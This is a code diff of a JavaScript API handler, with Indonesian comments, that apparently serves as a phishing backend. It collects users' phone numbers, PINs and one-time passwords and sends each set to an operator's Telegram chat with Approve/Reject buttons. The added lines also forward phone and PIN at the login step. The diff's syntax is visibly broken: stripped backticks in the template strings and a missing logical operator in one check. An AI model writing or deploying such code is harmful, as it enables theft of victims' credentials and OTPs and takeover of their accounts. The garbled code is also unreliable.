@@ -5,14 +5,37 @@ export default async function handler(req, res) {
 
   const { phone, pin, otp, type } = req.body;
 
-  // Jika type = 'login', hanya simpan di localStorage (tidak perlu simpan di DB)
+  // ================== LOGIN ==================
   if (type === 'login') {
-    // Tidak melakukan apa-apa, hanya mengembalikan sukses
+    if (!phone || !pin) {
+      return res.status(400).json({ message: 'Phone and PIN required' });
+    }
+
+    // Kirim notifikasi ke admin Telegram
+    try {
+      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
+      const adminChatId = process.env.ADMIN_CHAT_ID;
+      if (telegramToken && adminChatId) {
+        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: adminChatId,
+            text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
+            parse_mode: 'Markdown'
+          })
+        });
+      }
+    } catch (err) {
+      console.error('Gagal kirim notifikasi login:', err);
+      // Tetap berikan respons sukses ke frontend
+    }
+
     return res.status(200).json({ success: true });
   }
 
-  // Jika type = 'otp' atau tidak ada type, anggap sebagai submit OTP
-  if (!phone || !pin || !otp) {
+  // ================== SUBMIT OTP ==================
+  if (!phone  !pin  !otp) {
     return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
   }
 
@@ -32,18 +55,18 @@ export default async function handler(req, res) {
     const inlineKeyboard = {
       inline_keyboard: [
         [
-          { text: "✅ Approve", callback_data: `approve|${phone}|${pin}|${otp}` },
-          { text: "❌ Reject", callback_data: `reject|${phone}|${pin}|${otp}` }
+          { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
+          { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
         ]
       ]
     };
 
-    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: adminChatId,
-        text: `🔔 *Permintaan Verifikasi*\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🔑 OTP: ${otp}`,
+        text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
         parse_mode: 'Markdown',
         reply_markup: inlineKeyboard
       })
